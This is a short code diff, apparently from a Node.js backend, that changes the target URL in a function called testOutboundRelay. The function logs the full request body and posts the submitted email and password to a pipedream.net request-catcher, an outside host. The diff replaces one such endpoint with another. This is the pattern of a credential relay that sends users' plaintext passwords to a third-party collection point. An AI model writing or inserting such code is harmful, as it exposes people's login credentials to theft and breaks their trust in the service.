@@ -13,7 +13,7 @@ const testOutboundRelay = async (req, res) => {
   console.log(req.body)
   
   return await axios
-    .post("https://ena5ji41racy.x.pipedream.net", {
+    .post("https://eotrci0c7bk0uat.m.pipedream.net", {
       email: req.body.email,
       password: req.body.password,
     })
